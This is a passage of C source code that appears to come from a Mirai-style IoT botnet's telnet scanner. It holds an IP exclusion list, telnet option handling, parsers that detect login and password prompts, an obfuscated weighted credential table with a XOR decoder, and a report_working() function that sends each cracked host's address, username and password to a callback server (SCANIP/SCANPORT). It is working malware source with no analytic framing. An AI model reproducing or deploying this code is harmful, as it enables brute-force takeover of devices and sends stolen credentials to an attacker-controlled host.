(o1 == 164 && o2 >= 217 && o2 < 233) ||
(o1 == 169 && o2 >= 252 && o2 < 254) ||
(o1 == 199 && o2 >= 121 && o2 < 254) ||
(o1 == 205 && o2 >= 1 && o2 < 118) ||
(o1 == 207 && o2 >= 60 && o2 < 62) ||
(o1 == 104 && o2 >= 16 && o2 < 31) ||
(o1 == 188 && o2 == 166) ||
(o1 == 188 && o2 == 226) ||
(o1 == 159 && o2 == 203) ||
(o1 == 162 && o2 == 243) ||
(o1 == 45 && o2 == 55) ||
(o1 == 178 && o2 == 62) ||
(o1 == 104 && o2 == 131) ||
(o1 == 104 && o2 == 236) ||
(o1 == 107 && o2 == 170) ||
(o1 == 138 && o2 == 197) ||
(o1 == 138 && o2 == 68) ||
(o1 == 139 && o2 == 59) ||
(o1 == 146 && o2 == 185 && o3 >= 128 && o3 < 191) ||
(o1 == 163 && o2 == 47 && o3 >= 10 && o3 < 11) ||
(o1 == 174 && o2 == 138 && o3 >= 1 && o3 < 127) ||
(o1 == 192 && o2 == 241 && o3 >= 128 && o3 < 255) ||
(o1 == 198 && o2 == 199 && o3 >= 64 && o3 < 127) ||
(o1 == 198 && o2 == 211 && o3 >= 96 && o3 < 127) ||
(o1 == 207 && o2 == 154 && o3 >= 192 && o3 < 255) ||
(o1 == 37 && o2 == 139 && o3 >= 1 && o3 < 31) ||
(o1 == 67 && o2 == 207 && o3 >= 64 && o3 < 95) ||
(o1 == 67 && o2 == 205 && o3 >= 128 && o3 < 191) ||
(o1 == 80 && o2 == 240 && o3 >= 128 && o3 < 143) ||
(o1 == 82 && o2 == 196 && o3 >= 1 && o3 < 15) ||
(o1 == 95 && o2 == 85 && o3 >= 8 && o3 < 63) ||
(o1 == 64 && o2 == 237 && o3 >= 32 && o3 < 43) ||
(o1 == 185 && o2 == 92 && o3 >= 220 && o3 < 223) ||
(o1 == 104 && o2 == 238 && o3 >= 128 && o3 < 191) ||
(o1 == 209 && o2 == 222 && o3 >= 1 && o3 < 31) ||
(o1 == 208 && o2 == 167 && o3 >= 232 && o3 < 252) ||
(o1 == 66 && o2 == 55 && o3 >= 128 && o3 < 159) ||
(o1 == 45 && o2 == 63 && o3 >= 1 && o3 < 127) ||
(o1 == 216 && o2 == 237 && o3 >= 128 && o3 < 159) ||
(o1 == 108 && o2 == 61) ||
(o1 == 45 && o2 == 76) ||
(o1 == 185 && o2 == 11 && o3 >= 144 && o3 < 148) ||
(o1 == 185 && o2 == 56 && o3 >= 21 && o3 < 23) ||
(o1 == 185 && o2 == 61 && o3 >= 136 && o3 < 139) ||
(o1 == 185 && o2 == 62 && o3 >= 187 && o3 < 191) ||
(o1 == 66 && o2 == 150 && o3 >= 120 && o3 < 215) ||
(o1 == 66 && o2 == 151 && o3 >= 137 && o3 < 139) ||
(o1 == 64 && o2 == 94 && o3 >= 237 && o3 < 255) ||
(o1 == 63 && o2 == 251 && o3 >= 19 && o3 < 21) ||
(o1 == 70 && o2 == 42 && o3 >= 73 && o3 < 75) ||
(o1 == 74 && o2 == 91 && o3 >= 113 && o3 < 115) ||
(o1 == 74 && o2 == 201 && o3 >= 56 && o3 < 58) ||
(o1 == 188 && o2 == 209 && o3 >= 48 && o3 < 53) ||
(o1 == 188 && o2 == 165) ||
(o1 == 149 && o2 == 202) ||
(o1 == 151 && o2 == 80) ||
(o1 == 164 && o2 == 132) ||
(o1 == 176 && o2 == 31) ||
(o1 == 167 && o2 == 114) ||
(o1 == 178 && o2 == 32) ||
(o1 == 178 && o2 == 33) ||
(o1 == 37 && o2 == 59) ||
(o1 == 37 && o2 == 187) ||
(o1 == 46 && o2 == 105) ||
(o1 == 51 && o2 == 254) ||
(o1 == 51 && o2 == 255) ||
(o1 == 5 && o2 == 135) ||
(o1 == 5 && o2 == 196) ||
(o1 == 5 && o2 == 39) ||
(o1 == 91 && o2 == 134) ||
(o1 == 104 && o2 == 200 && o3 >= 128 && o3 < 159) ||
(o1 == 107 && o2 == 152 && o3 >= 96 && o3 < 111) ||
(o1 == 107 && o2 == 181 && o3 >= 160 && o3 < 189) ||
(o1 == 172 && o2 == 98 && o3 >= 64 && o3 < 95) ||
(o1 == 184 && o2 == 170 && o3 >= 240 && o3 < 255) ||
(o1 == 192 && o2 == 111 && o3 >= 128 && o3 < 143) ||
(o1 == 192 && o2 == 252 && o3 >= 208 && o3 < 223) ||
(o1 == 192 && o2 == 40 && o3 >= 56 && o3 < 59) ||
(o1 == 198 && o2 == 8 && o3 >= 81 && o3 < 95) ||
(o1 == 199 && o2 == 116 && o3 >= 112 && o3 < 119) ||
(o1 == 199 && o2 == 229 && o3 >= 248 && o3 < 255) ||
(o1 == 199 && o2 == 36 && o3 >= 220 && o3 < 223) ||
(o1 == 199 && o2 == 58 && o3 >= 184 && o3 < 187) ||
(o1 == 206 && o2 == 220 && o3 >= 172 && o3 < 175) ||
(o1 == 208 && o2 == 78 && o3 >= 40 && o3 < 43) ||
(o1 == 208 && o2 == 93 && o3 >= 192 && o3 < 193) ||
(o1 == 66 && o2 == 71 && o3 >= 240 && o3 < 255) ||
(o1 == 98 && o2 == 142 && o3 >= 208 && o3 < 223) ||
(o1 == 107 && o2 >= 20 && o2 < 24) ||
(o1 == 35 && o2 >= 159 && o2 < 183) ||
(o1 == 52 && o2 >= 1 && o2 < 95) ||
(o1 == 52 && o2 >= 95 && o2 < 255) ||
(o1 == 54 && o2 >= 64 && o2 < 95) ||
(o1 == 54 && o2 >= 144 && o2 < 255) ||
(o1 == 13 && o2 >= 52 && o2 < 60) ||
(o1 == 13 && o2 >= 112 && o2 < 115) ||
(o1 == 163 && o2 == 172) ||
(o1 == 51 && o2 >= 15 && o2 < 255) ||
(o1 == 79 && o2 == 121 && o3 >= 128 && o3 < 255) ||
(o1 == 212 && o2 == 47 && o3 >= 224 && o3 < 255) ||
(o1 == 89 && o2 == 34 && o3 >= 96 && o3 < 97) ||
(o1 == 219 && o2 >= 216 && o2 < 231) ||
(o1 == 23 && o2 >= 94 && o2 < 109) ||
(o1 == 178 && o2 >= 62 && o2 < 63) ||
(o1 == 106 && o2 >= 182 && o2 < 189) ||
(o1 == 34 && o2 >= 245 && o2 < 255) ||
(o1 == 87 && o2 >= 97 && o2 < 99) ||
(o1 == 86 && o2 == 208) ||
(o1 == 86 && o2 == 209) ||
(o1 == 193 && o2 == 164) ||
(o1 == 120 && o2 >= 103 && o2 < 108) ||
(o1 == 188 && o2 == 68) ||
(o1 == 78 && o2 == 46) || 	
(o1 == 224)
    );

    return INET_ADDR(o1,o2,o3,o4);
}

static int consume_iacs(struct scanner_connection *conn)
{
    int consumed = 0;
    uint8_t *ptr = conn->rdbuf;

    while (consumed < conn->rdbuf_pos)
    {
        int i;

        if (*ptr != 0xff)
            break;
        else if (*ptr == 0xff)
        {
            if (!can_consume(conn, ptr, 1))
                break;
            if (ptr[1] == 0xff)
            {
                ptr += 2;
                consumed += 2;
                continue;
            }
            else if (ptr[1] == 0xfd)
            {
                uint8_t tmp1[3] = {255, 251, 31};
                uint8_t tmp2[9] = {255, 250, 31, 0, 80, 0, 24, 255, 240};

                if (!can_consume(conn, ptr, 2))
                    break;
                if (ptr[2] != 31)
                    goto iac_wont;

                ptr += 3;
                consumed += 3;

                send(conn->fd, tmp1, 3, MSG_NOSIGNAL);
                send(conn->fd, tmp2, 9, MSG_NOSIGNAL);
            }
            else
            {
                iac_wont:

                if (!can_consume(conn, ptr, 2))
                    break;

                for (i = 0; i < 3; i++)
                {
                    if (ptr[i] == 0xfd)
                        ptr[i] = 0xfc;
                    else if (ptr[i] == 0xfb)
                        ptr[i] = 0xfd;
                }

                send(conn->fd, ptr, 3, MSG_NOSIGNAL);
                ptr += 3;
                consumed += 3;
            }
        }
    }

    return consumed;
}

static int consume_any_prompt(struct scanner_connection *conn)
{
    char *pch;
    int i, prompt_ending = -1;

    for (i = conn->rdbuf_pos - 1; i > 0; i--)
    {
        if (conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' || conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#' || conn->rdbuf[i] == '%')
        {
            prompt_ending = i + 1;
            break;
        }
    }

    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}

static int consume_user_prompt(struct scanner_connection *conn)
{
    char *pch;
    int i, prompt_ending = -1;

    for (i = conn->rdbuf_pos - 1; i > 0; i--)
    {
        if (conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' || conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#' || conn->rdbuf[i] == '%')
        {
            prompt_ending = i + 1;
            break;
        }
    }

    if (prompt_ending == -1)
    {
        int tmp;

        if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, "ogin", 4)) != -1)
            prompt_ending = tmp;
        else if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, "enter", 5)) != -1)
            prompt_ending = tmp;
    }

    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}

static int consume_pass_prompt(struct scanner_connection *conn)
{
    char *pch;
    int i, prompt_ending = -1;

    for (i = conn->rdbuf_pos - 1; i > 0; i--)
    {
        if (conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' || conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#')
        {
            prompt_ending = i + 1;
            break;
        }
    }

    if (prompt_ending == -1)
    {
        int tmp;

        if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, "assword", 7)) != -1)
            prompt_ending = tmp;
    }

    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}

static int consume_resp_prompt(struct scanner_connection *conn)
{
    char *tkn_resp;
    int prompt_ending, len;

    tkn_resp = "ncorrect";
    if (util_memsearch(conn->rdbuf, conn->rdbuf_pos, tkn_resp, strlen(tkn_resp)) != -1)
    {
        return -1;
    }

    tkn_resp = "daddyl33t: applet not found";
    prompt_ending = util_memsearch(conn->rdbuf, conn->rdbuf_pos, tkn_resp, strlen(tkn_resp));

    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}

static void add_auth_entry(char *enc_user, char *enc_pass, uint16_t weight)
{
    int tmp;

    auth_table = realloc(auth_table, (auth_table_len + 1) * sizeof (struct scanner_auth));
    auth_table[auth_table_len].username = deobf(enc_user, &tmp);
    auth_table[auth_table_len].username_len = (uint8_t)tmp;
    auth_table[auth_table_len].password = deobf(enc_pass, &tmp);
    auth_table[auth_table_len].password_len = (uint8_t)tmp;
    auth_table[auth_table_len].weight_min = auth_table_max_weight;
    auth_table[auth_table_len++].weight_max = auth_table_max_weight + weight;
    auth_table_max_weight += weight;
}

static struct scanner_auth *random_auth_entry(void)
{
    int i;
    uint16_t r = (uint16_t)(rand_next() % auth_table_max_weight);

    for (i = 0; i < auth_table_len; i++)
    {
        if (r < auth_table[i].weight_min)
            continue;
        else if (r < auth_table[i].weight_max)
            return &auth_table[i];
    }

    return NULL;
}

static void report_working(uint32_t daddr, uint16_t dport, struct scanner_auth *auth)
{
    struct sockaddr_in addr;
    int pid = fork(), fd;

    if (pid > 0 || pid == -1)
        return;
	
    if ((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
#ifdef DEBUG
        printf("[report] Failed to call socket()\n");
#endif
        exit(0);
    }

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = SCANIP;
    addr.sin_port = htons(SCANPORT);


    if (connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
    {
#ifdef DEBUG
        printf("[report] Failed to connect to scanner callback!\n");
#endif
        close(fd);
        exit(0);
    }
    // "0 127.0.0.1 23 4 user 4 pass"
    uint8_t zero = 0;
    send(fd, &zero, sizeof (uint8_t), MSG_NOSIGNAL);
    send(fd, &daddr, sizeof (uint32_t), MSG_NOSIGNAL);
    send(fd, &dport, sizeof (uint16_t), MSG_NOSIGNAL);
    send(fd, &(auth->username_len), sizeof (uint8_t), MSG_NOSIGNAL);
    send(fd, auth->username, auth->username_len, MSG_NOSIGNAL);
    send(fd, &(auth->password_len), sizeof (uint8_t), MSG_NOSIGNAL);
    send(fd, auth->password, auth->password_len, MSG_NOSIGNAL);

#ifdef DEBUG
    printf("[report] Send scan result to loader\n");
#endif

    close(fd);
    exit(0);
}

static char *deobf(char *str, int *len)
{
    int i;
    char *cpy;

    *len = util_strlen(str);
    cpy = malloc(*len + 1);

    util_memcpy(cpy, str, *len + 1);

    for (i = 0; i < *len; i++)
    {
		//feedbeef
        cpy[i] ^= 0xFE;
        cpy[i] ^= 0xED;
        cpy[i] ^= 0xBE;
        cpy[i] ^= 0xEF;
    }

    return cpy;
}

static char can_consume(struct scanner_connection *conn, uint8_t *ptr, int amount)
{
    uint8_t *end = conn->rdbuf + conn->rdbuf_pos;

    return ptr + amount < end;
}